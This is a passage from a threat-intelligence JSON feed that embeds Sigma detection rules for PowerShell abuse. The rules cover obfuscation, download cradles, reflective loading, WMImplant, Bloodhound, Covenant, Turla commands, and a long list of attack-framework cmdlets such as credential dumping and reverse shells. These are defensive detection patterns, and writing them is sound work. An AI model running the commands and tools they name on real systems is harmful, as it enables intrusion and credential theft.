MiniDumpWriteDump\n    - msvcrt\n    - ntdll\n    - OpenDesktop\n    - OpenProcess\n    - OpenProcessToken\n    - OpenThreadToken\n    - OpenWindowStation\n    - QueueUserApc\n    - ReadProcessMemory\n    - RevertToSelf\n    - RtlCreateUserThread\n    - secur32\n    - SetThreadToken\n    - VirtualAlloc\n    - VirtualFree\n    - VirtualProtect\n    - WaitForSingleObject\n    - WriteInt32\n    - WriteProcessMemory\n    - ZeroFreeGlobalAllocUnicode\nfalsepositives:\n- Carbon PowerShell Module (https://github.com/webmd-health-services/Carbon)\nid: 03d83090-8cba-44a0-b02f-0b756a050306\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2023/01/09\nreferences:\n- https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse\nrelated:\n- id: 03d83090-8cba-44a0-b02f-0b756a050306\n  type: similar\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.t1106\ntitle: Potential WinAPI Calls Via PowerShell Scripts\n",
                            "sigma:id": "03d83090-8cba-44a0-b02f-0b756a050306",
                            "title": "Potential WinAPI Calls Via PowerShell Scripts",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9c14c9fa-1a63-4a64-8e57-d19280559490",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via Stdin in Scripts",
                            "raw": "author: Nikita Nazarov, oscd.community\ndate: 2020/10/12\ndescription: Detects Obfuscated Powershell via Stdin in Scripts\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - environment\n    - invoke\n    - input\n    CommandLine|contains|all:\n    - set\n    - '&&'\nfalsepositives:\n- Unknown\nid: 9c14c9fa-1a63-4a64-8e57-d19280559490\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/16\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation Via Stdin\n",
                            "sigma:id": "9c14c9fa-1a63-4a64-8e57-d19280559490",
                            "title": "Invoke-Obfuscation Via Stdin",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "095c4227-2a9e-45da-9268-cec186be53b1",
                        "lookup_data": {
                            "description": "Back in Black: Unlocking a LockBit 3.0 Ransomware Attack",
                            "link": "http://www.botvrij.eu/data/feed-osint/095c4227-2a9e-45da-9268-cec186be53b1.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1661104992",
                            "uuid": "095c4227-2a9e-45da-9268-cec186be53b1",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "c70e019b-1479-4b65-b0cc-cd0c6093a599",
                        "lookup_data": {
                            "description": "Detects PowerShell called from an executable by the version mismatch method",
                            "raw": "author: Sean Metcalf (source), Florian Roth (Nextron Systems)\ndate: 2017/03/05\ndescription: Detects PowerShell called from an executable by the version mismatch\n  method\ndetection:\n  condition: selection1\n  selection1:\n    EngineVersion|startswith:\n    - '2.'\n    - '4.'\n    - '5.'\n    HostVersion|startswith: '3.'\nfalsepositives:\n- Unknown\nid: c70e019b-1479-4b65-b0cc-cd0c6093a599\nlevel: high\nlogsource:\n  category: ps_classic_start\n  definition: fields have to be extract from event\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://adsecurity.org/?p=2921\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.execution\n- attack.t1059.001\ntitle: PowerShell Called from an Executable Version Mismatch\n",
                            "sigma:id": "c70e019b-1479-4b65-b0cc-cd0c6093a599",
                            "title": "PowerShell Called from an Executable Version Mismatch",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "52cad028-0ff0-4854-8f67-d25dfcbc78b4",
                        "lookup_data": {
                            "description": "Detects a suspicious child process of a Microsoft HTML Help system when executing compiled HTML files (.chm)",
                            "raw": "author: Maxim Pavlunin\ndate: 2020/04/01\ndescription: Detects a suspicious child process of a Microsoft HTML Help system when\n  executing compiled HTML files (.chm)\ndetection:\n  condition: 1 of selection_*\n  selection_1:\n    Image|endswith:\n    - \\cmd.exe\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\wscript.exe\n    - \\cscript.exe\n    - \\regsvr32.exe\n    - \\wmic.exe\n    - \\rundll32.exe\n    - \\MSHTA.EXE\n    - \\CertUtil.exe\n    - \\CertReq.exe\n    - \\MSbuild.exe\n    - \\installutil.exe\n    - \\schtasks.exe\n    - \\msiexec.exe\n    ParentImage:\n    - C:\\Windows\\hh.exe\n    - C:\\Windows\\SysWOW64\\hh.exe\n  selection_2:\n    CommandLine|contains:\n    - .application\n    - \\Downloads\\\n    - \\Content.Outlook\\\n    - \\AppData\\Local\\Temp\\\n    Image|endswith:\n    - \\Windows\\hh.exe\n    - \\Windows\\SysWOW64\\hh.exe\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 52cad028-0ff0-4854-8f67-d25dfcbc78b4\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/24\nreferences:\n- https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/chm-badness-delivers-a-banking-trojan/\n- https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-27939090904026cc396b0b629c8e4314acd6f5dac40a676edbc87f4567b47eb7\n- https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.001\n- attack.t1218.010\n- attack.t1218.011\n- attack.execution\n- attack.t1059.001\n- attack.t1059.003\n- attack.t1059.005\n- attack.t1059.007\n- attack.t1047\n- attack.t1566\n- attack.t1566.001\n- attack.initial_access\n- attack.t1218\ntitle: HTML Help Shell Spawn\n",
                            "sigma:id": "52cad028-0ff0-4854-8f67-d25dfcbc78b4",
                            "title": "HTML Help Shell Spawn",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7e9c7999-0f9b-4d4a-a6ed-af6d553d4af4",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via use MSHTA in Scripts",
                            "raw": "author: Nikita Nazarov, oscd.community\ndate: 2020/10/09\ndescription: Detects Obfuscated Powershell via use MSHTA in Scripts\ndetection:\n  condition: selection\n  selection:\n    EventID: 7045\n    ImagePath|contains|all:\n    - mshta\n    - vbscript:createobject\n    Provider_Name: Service Control Manager\nfalsepositives:\n- Unknown\nid: 7e9c7999-0f9b-4d4a-a6ed-af6d553d4af4\nlevel: high\nlogsource:\n  product: windows\n  service: system\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation Via Use MSHTA - System\n",
                            "sigma:id": "7e9c7999-0f9b-4d4a-a6ed-af6d553d4af4",
                            "title": "Invoke-Obfuscation Via Use MSHTA - System",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9e2e51c5-c699-4794-ba5a-29f5da40ac0c",
                        "lookup_data": {
                            "description": "Detects commands used by Turla group as reported by ESET in May 2020",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2020/05/26\ndescription: Detects commands used by Turla group as reported by ESET in May 2020\ndetection:\n  condition: 1 of selection*\n  selection1:\n    CommandLine|contains:\n    - tracert -h 10 yahoo.com\n    - .WSqmCons))|iex;\n    - Fr`omBa`se6`4Str`ing\n  selection2:\n    CommandLine|contains|all:\n    - net use https://docs.live.net\n    - '@aol.co.uk'\nfalsepositives:\n- Unknown\nid: 9e2e51c5-c699-4794-ba5a-29f5da40ac0c\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf\nstatus: test\ntags:\n- attack.g0010\n- attack.execution\n- attack.t1059.001\n- attack.t1053.005\n- attack.t1027\ntitle: Turla Group Commands May 2020\n",
                            "sigma:id": "9e2e51c5-c699-4794-ba5a-29f5da40ac0c",
                            "title": "Turla Group Commands May 2020",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "d0d28567-4b9a-45e2-8bbc-fb1b66a1f7f6",
                        "lookup_data": {
                            "description": "Detects Too long PowerShell command lines",
                            "raw": "author: oscd.community, Natalia Shornikova\ndate: 2020/10/06\ndescription: Detects Too long PowerShell command lines\ndetection:\n  condition: all of selection*\n  selection_length:\n    CommandLine|re: .{1000,}\n  selection_powershell:\n  - CommandLine|contains:\n    - powershell\n    - pwsh\n  - Description: Windows Powershell\n  - Product: PowerShell Core 6\nfalsepositives:\n- Unknown\nid: d0d28567-4b9a-45e2-8bbc-fb1b66a1f7f6\nlevel: low\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Too Long PowerShell Commandlines\n",
                            "sigma:id": "d0d28567-4b9a-45e2-8bbc-fb1b66a1f7f6",
                            "title": "Too Long PowerShell Commandlines",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "fce5f582-cc00-41e1-941a-c6fabf0fdb8c",
                        "lookup_data": {
                            "description": "Detects suspicious PowerShell invocation command parameters",
                            "raw": "author: Florian Roth (rule), Jonhnathan Ribeiro\ndate: 2017/03/05\ndescription: Detects suspicious PowerShell invocation command parameters\ndetection:\n  condition: 1 of them\n  convert_b64:\n    Message|contains|all:\n    - -nop\n    - ' -w '\n    - hidden\n    - ' -c '\n    - '[Convert]::FromBase64String'\n  enc_selection:\n    Message|contains|all:\n    - ' -w '\n    - hidden\n    - -ep\n    - bypass\n    - -Enc\n  iex_selection:\n    Message|contains|all:\n    - ' -w '\n    - hidden\n    - -noni\n    - -nop\n    - ' -c '\n    - iex\n    - New-Object\n  iex_webclient:\n    Message|contains|all:\n    - iex\n    - New-Object\n    - Net.WebClient\n    - .Download\n  reg_selection:\n    Message|contains|all:\n    - powershell\n    - reg\n    - add\n    - HKCU\\software\\microsoft\\windows\\currentversion\\run\n  webclient_selection:\n    Message|contains|all:\n    - bypass\n    - -noprofile\n    - -windowstyle\n    - hidden\n    - new-object\n    - system.net.webclient\n    - .download\nfalsepositives:\n- Penetration tests\nid: fce5f582-cc00-41e1-941a-c6fabf0fdb8c\nlevel: high\nlogsource:\n  product: windows\n  service: powershell\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.t1086\ntitle: Suspicious PowerShell Invocations - Specific\n",
                            "sigma:id": "fce5f582-cc00-41e1-941a-c6fabf0fdb8c",
                            "title": "Suspicious PowerShell Invocations - Specific",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "3b6ab547-8ec2-4991-b9d2-2b06702a48d7",
                        "lookup_data": {
                            "description": "Detects a Powershell process that contains download commands in its command line string",
                            "raw": "author: Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro\ndate: 2019/01/16\ndescription: Detects a Powershell process that contains download commands in its command\n  line string\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains:\n    - string(\n    - file(\n    CommandLine|contains|all:\n    - new-object\n    - net.webclient).\n    - download\n  selection_img:\n  - Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n  - OriginalFileName:\n    - PowerShell.EXE\n    - pwsh.dll\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/26\nrelated:\n- id: e6c54d94-498c-4562-a37c-b469d8e9a275\n  type: derived\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: PowerShell Download Pattern\n",
                            "sigma:id": "3b6ab547-8ec2-4991-b9d2-2b06702a48d7",
                            "title": "PowerShell Download Pattern",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "11b52f18-aaec-4d60-9143-5dd8cc4706b9",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via RUNDLL LAUNCHER",
                            "raw": "author: Timur Zinniatullin, oscd.community\ndate: 2020/10/18\ndescription: Detects Obfuscated Powershell via RUNDLL LAUNCHER\ndetection:\n  condition: selection\n  selection:\n    EventID: 7045\n    ImagePath|contains|all:\n    - rundll32.exe\n    - shell32.dll\n    - shellexec_rundll\n    - powershell\n    Provider_Name: Service Control Manager\nfalsepositives:\n- Unknown\nid: 11b52f18-aaec-4d60-9143-5dd8cc4706b9\nlevel: medium\nlogsource:\n  product: windows\n  service: system\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation RUNDLL LAUNCHER - System\n",
                            "sigma:id": "11b52f18-aaec-4d60-9143-5dd8cc4706b9",
                            "title": "Invoke-Obfuscation RUNDLL LAUNCHER - System",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "62b7ccc9-23b4-471e-aa15-6da3663c4d59",
                        "lookup_data": {
                            "description": "Detects base64 encoded .NET reflective loading of Assembly",
                            "raw": "author: Christian Burkard (Nextron Systems), pH-T (Nextron Systems)\ndate: 2022/03/01\ndescription: Detects base64 encoded .NET reflective loading of Assembly\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA\n    - sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA\n    - bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA\n    - AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiAC\n    - BbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgAp\n    - AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAK\n    - WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQ\n    - sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkA\n    - bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApA\n    - WwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA\n    - sAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA\n    - bAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA\nfalsepositives:\n- Unlikely\nfields:\n- CommandLine\nid: 62b7ccc9-23b4-471e-aa15-6da3663c4d59\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/30\nreferences:\n- https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/mal_revil.yar\n- https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/\nrelated:\n- id: 9c0295ce-d60d-40bd-bd74-84673b7592b1\n  type: similar\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.defense_evasion\n- attack.t1027\n- attack.t1620\ntitle: PowerShell Base64 Encoded Reflective Assembly Load\n",
                            "sigma:id": "62b7ccc9-23b4-471e-aa15-6da3663c4d59",
                            "title": "PowerShell Base64 Encoded Reflective Assembly Load",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "8028c2c3-e25a-46e3-827f-bbb5abf181d7",
                        "lookup_data": {
                            "description": "Detects parameters used by WMImplant",
                            "raw": "author: NVISO\ndate: 2020/03/26\ndescription: Detects parameters used by WMImplant\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains:\n    - WMImplant\n    - ' change_user '\n    - ' gen_cli '\n    - ' command_exec '\n    - ' disable_wdigest '\n    - ' disable_winrm '\n    - ' enable_wdigest '\n    - ' enable_winrm '\n    - ' registry_mod '\n    - ' remote_posh '\n    - ' sched_job '\n    - ' service_mod '\n    - ' process_kill '\n    - ' active_users '\n    - ' basic_info '\n    - ' power_off '\n    - ' vacant_system '\n    - ' logon_events '\nfalsepositives:\n- Administrative scripts that use the same keywords.\nid: 8028c2c3-e25a-46e3-827f-bbb5abf181d7\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://github.com/FortyNorthSecurity/WMImplant\nstatus: test\ntags:\n- attack.execution\n- attack.t1047\n- attack.t1059.001\ntitle: WMImplant Hack Tool\n",
                            "sigma:id": "8028c2c3-e25a-46e3-827f-bbb5abf181d7",
                            "title": "WMImplant Hack Tool",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "487c7524-f892-4054-b263-8a0ace63fc25",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via Stdin in Scripts",
                            "raw": "author: Nikita Nazarov, oscd.community\ndate: 2020/10/12\ndescription: Detects Obfuscated Powershell via Stdin in Scripts\ndetection:\n  condition: selection\n  selection:\n    EventID: 7045\n    ImagePath|contains:\n    - environment\n    - invoke\n    - input\n    ImagePath|contains|all:\n    - set\n    - '&&'\n    Provider_Name: Service Control Manager\nfalsepositives:\n- Unknown\nid: 487c7524-f892-4054-b263-8a0ace63fc25\nlevel: high\nlogsource:\n  product: windows\n  service: system\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation Via Stdin - System\n",
                            "sigma:id": "487c7524-f892-4054-b263-8a0ace63fc25",
                            "title": "Invoke-Obfuscation Via Stdin - System",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f376c8a7-a2d0-4ddc-aa0c-16c17236d962",
                        "lookup_data": {
                            "description": "Detects command line parameters used by Bloodhound and Sharphound hack tools",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/12/20\ndescription: Detects command line parameters used by Bloodhound and Sharphound hack\n  tools\ndetection:\n  condition: 1 of selection*\n  selection1:\n    Image|contains:\n    - \\Bloodhound.exe\n    - \\SharpHound.exe\n  selection2:\n    CommandLine|contains:\n    - ' -CollectionMethod All '\n    - ' --CollectionMethods Session '\n    - ' --Loop --Loopduration '\n    - ' --PortScanTimeout '\n    - '.exe -c All -d '\n    - Invoke-Bloodhound\n    - Get-BloodHoundData\n  selection3:\n    CommandLine|contains|all:\n    - ' -JsonFolder '\n    - ' -ZipFileName '\n  selection4:\n    CommandLine|contains|all:\n    - ' DCOnly '\n    - ' --NoSaveCache '\n  selection5:\n  - Product|contains: SharpHound\n  - Description|contains: SharpHound\n  - Company|contains:\n    - SpecterOps\n    - evil corp\nfalsepositives:\n- Other programs that use these command line option and accepts an 'All' parameter\nid: f376c8a7-a2d0-4ddc-aa0c-16c17236d962\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/12\nreferences:\n- https://github.com/BloodHoundAD/BloodHound\n- https://github.com/BloodHoundAD/SharpHound\nstatus: test\ntags:\n- attack.discovery\n- attack.t1087.001\n- attack.t1087.002\n- attack.t1482\n- attack.t1069.001\n- attack.t1069.002\n- attack.execution\n- attack.t1059.001\ntitle: Bloodhound and Sharphound Hack Tool\n",
                            "sigma:id": "f376c8a7-a2d0-4ddc-aa0c-16c17236d962",
                            "title": "Bloodhound and Sharphound Hack Tool",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "c260b6db-48ba-4b4a-a76f-2f67644e99d2",
                        "lookup_data": {
                            "description": "Detects suspicious command lines used in Covenant luanchers",
                            "raw": "author: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community\ndate: 2020/06/04\ndescription: Detects suspicious command lines used in Covenant luanchers\ndetection:\n  condition: selection or selection2\n  selection:\n    CommandLine|contains:\n    - -Command\n    - -EncodedCommand\n    CommandLine|contains|all:\n    - -Sta\n    - -Nop\n    - -Window\n    - Hidden\n  selection2:\n    CommandLine|contains:\n    - 'sv o (New-Object IO.MemorySteam);sv d '\n    - mshta file.hta\n    - GruntHTTP\n    - -EncodedCommand cwB2ACAAbwAgA\nid: c260b6db-48ba-4b4a-a76f-2f67644e99d2\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://posts.specterops.io/covenant-v0-5-eee0507b85ba\nstatus: test\ntags:\n- attack.execution\n- attack.defense_evasion\n- attack.t1059.001\n- attack.t1564.003\ntitle: Covenant Launcher Indicators\n",
                            "sigma:id": "c260b6db-48ba-4b4a-a76f-2f67644e99d2",
                            "title": "Covenant Launcher Indicators",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "3236fcd0-b7e3-4433-b4f8-86ad61a9af2d",
                        "lookup_data": {
                            "description": "Detects suspicious PowerShell download command",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/03/05\ndescription: Detects suspicious PowerShell download command\ndetection:\n  condition: all of selection_*\n  selection_download:\n    HostApplication|contains:\n    - .DownloadFile(\n    - .DownloadString(\n  selection_webclient:\n    HostApplication|contains: Net.WebClient\nfalsepositives:\n- PowerShell scripts that download content from the Internet\nid: 3236fcd0-b7e3-4433-b4f8-86ad61a9af2d\nlevel: medium\nlogsource:\n  category: ps_classic_start\n  definition: fields have to be extract from event\n  product: windows\nmodified: 2022/11/09\nreferences:\n- https://www.trendmicro.com/en_us/research/22/j/lv-ransomware-exploits-proxyshell-in-attack.html\nrelated:\n- id: 65531a81-a694-4e31-ae04-f8ba5bc33759\n  type: derived\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Suspicious PowerShell Download\n",
                            "sigma:id": "3236fcd0-b7e3-4433-b4f8-86ad61a9af2d",
                            "title": "Suspicious PowerShell Download",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "58cb02d5-78ce-4692-b3e1-dce850aae41a",
                        "lookup_data": {
                            "description": "Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe",
                            "raw": "author: Roberto Rodriguez @Cyb3rWard0g, Tim Shelton\ndate: 2019/09/12\ndescription: Detects alternate PowerShell hosts potentially bypassing detections looking\n  for powershell.exe\ndetection:\n  condition: selection and not 1 of filter*\n  filter1:\n    Image|endswith:\n    - \\powershell.exe\n    - \\powershell_ise.exe\n    - \\WINDOWS\\System32\\sdiagnhost.exe\n    - \\WINDOWS\\System32\\wsmprovhost.exe\n    - \\Windows\\system32\\dsac.exe\n    - \\Windows\\system32\\wbem\\wmiprvse.exe\n    - \\ForefrontActiveDirectoryConnector.exe\n    - c:\\windows\\system32\\inetsrv\\w3wp.exe\n  filter2:\n    Image: null\n  filter3:\n    Image|contains|all:\n    - :\\Program Files\n    - \\Microsoft SQL Server\\\n    Image|endswith: \\Tools\\Binn\\SQLPS.exe\n  filter4:\n    Image|startswith:\n    - C:\\Program Files\\Citrix\\\n    - C:\\Program Files\\Microsoft\\Exchange Server\\\n  filter5:\n    Image:\n    - C:\\Windows\\system32\\ServerManager.exe\n    - C:\\Program Files\\PowerShell\\7\\pwsh.exe\n  selection:\n    PipeName|startswith: \\PSHost\nfalsepositives:\n- Programs using PowerShell directly without invocation of a dedicated interpreter.\nfields:\n- ComputerName\n- User\n- Image\n- PipeName\nid: 58cb02d5-78ce-4692-b3e1-dce850aae41a\nlevel: medium\nlogsource:\n  category: pipe_created\n  definition: Note that you have to configure logging for Named Pipe Events in Sysmon\n    config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon\n    configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth\n    verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config,\n    https://github.com/olafhartong/sysmon-modular. How to test detection? You can\n    check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575\n  product: windows\nmodified: 2022/10/10\nreferences:\n- https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190815181010.html\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Alternate PowerShell Hosts Pipe\n",
                            "sigma:id": "58cb02d5-78ce-4692-b3e1-dce850aae41a",
                            "title": "Alternate PowerShell Hosts Pipe",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "02030f2f-6199-49ec-b258-ea71b07e03dc",
                        "lookup_data": {
                            "description": "Detects Commandlet names from well-known PowerShell exploitation frameworks",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023/01/02\ndescription: Detects Commandlet names from well-known PowerShell exploitation frameworks\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - Add-Exfiltration\n    - Add-Persistence\n    - Add-RegBackdoor\n    - Add-RemoteRegBackdoor\n    - Add-ScrnSaveBackdoor\n    - Check-VM\n    - ConvertTo-Rc4ByteStream\n    - Decrypt-Hash\n    - Do-Exfiltration\n    - Enabled-DuplicateToken\n    - Exploit-Jboss\n    - Find-Fruit\n    - Find-GPOLocation\n    - Find-TrustedDocuments\n    - Get-ApplicationHost\n    - Get-ChromeDump\n    - Get-ClipboardContents\n    - Get-FoxDump\n    - Get-GPPPassword\n    - Get-IndexedItem\n    - Get-Keystrokes\n    - Get-LSASecret\n    - Get-PassHashes\n    - Get-RegAlwaysInstallElevated\n    - Get-RegAutoLogon\n    - Get-RemoteBootKey\n    - Get-RemoteCachedCredential\n    - Get-RemoteLocalAccountHash\n    - Get-RemoteLSAKey\n    - Get-RemoteMachineAccountHash\n    - Get-RemoteNLKMKey\n    - Get-RickAstley\n    - Get-Screenshot\n    - Get-SecurityPackages\n    - Get-ServiceFilePermission\n    - Get-ServicePermission\n    - Get-ServiceUnquoted\n    - Get-SiteListPassword\n    - Get-System\n    - Get-TimedScreenshot\n    - Get-UnattendedInstallFile\n    - Get-Unconstrained\n    - Get-USBKeystrokes\n    - Get-VaultCredential\n    - Get-VulnAutoRun\n    - Get-VulnSchTask\n    - Gupt-Backdoor\n    - HTTP-Login\n    - Install-ServiceBinary\n    - Install-SSP\n    - Invoke-ACLScanner\n    - Invoke-ADSBackdoor\n    - Invoke-AllChecks\n    - Invoke-ARPScan\n    - Invoke-AzureHound\n    - Invoke-BackdoorLNK\n    - Invoke-BadPotato\n    - Invoke-BetterSafetyKatz\n    - Invoke-BypassUAC\n    - Invoke-Carbuncle\n    - Invoke-Certify\n    - Invoke-ConPtyShell\n    - Invoke-CredentialInjection\n    - Invoke-DAFT\n    - Invoke-DCSync\n    - Invoke-DinvokeKatz\n    - Invoke-DllInjection\n    - Invoke-DomainPasswordSpray\n    - Invoke-DowngradeAccount\n    - Invoke-EgressCheck\n    - Invoke-Eyewitness\n    - Invoke-FakeLogonScreen\n    - Invoke-Farmer\n    - Invoke-Get-RBCD-Threaded\n    - Invoke-Gopher\n    - Invoke-Grouper\n    - Invoke-HandleKatz\n    - Invoke-ImpersonatedProcess\n    - Invoke-ImpersonateSystem\n    - Invoke-InteractiveSystemPowerShell\n    - Invoke-Internalmonologue\n    - Invoke-Inveigh\n    - Invoke-InveighRelay\n    - Invoke-KrbRelay\n    - Invoke-LdapSignCheck\n    - Invoke-Lockless\n    - Invoke-MalSCCM\n    - Invoke-Mimikatz\n    - Invoke-Mimikittenz\n    - Invoke-MITM6\n    - Invoke-NanoDump\n    - Invoke-NetRipper\n    - Invoke-Nightmare\n    - Invoke-NinjaCopy\n    - Invoke-OfficeScrape\n    - Invoke-OxidResolver\n    - Invoke-P0wnedshell\n    - Invoke-Paranoia\n    - Invoke-PortScan\n    - Invoke-PoshRatHttp\n    - Invoke-PostExfil\n    - Invoke-PowerDump\n    - Invoke-PowerShellTCP\n    - Invoke-PowerShellWMI\n    - Invoke-PPLDump\n    - Invoke-PsExec\n    - Invoke-PSInject\n    - Invoke-PsUaCme\n    - Invoke-ReflectivePEInjection\n    - Invoke-ReverseDNSLookup\n    - Invoke-Rubeus\n    - Invoke-RunAs\n    - Invoke-SafetyKatz\n    - Invoke-SauronEye\n    - Invoke-SCShell\n    - Invoke-Seatbelt\n    - Invoke-ServiceAbuse\n    - Invoke-ShadowSpray\n    - Invoke-Sharp\n    - Invoke-Shellcode\n    - Invoke-SMBScanner\n    - Invoke-Snaffler\n    - Invoke-Spoolsample\n    - Invoke-SpraySinglePassword\n    - Invoke-SSHCommand\n    - Invoke-StandIn\n    - Invoke-StickyNotesExtract\n    - Invoke-SystemCommand\n    - Invoke-Tasksbackdoor\n    - Invoke-Tater\n    - Invoke-Thunderfox\n    - Invoke-ThunderStruck\n    - 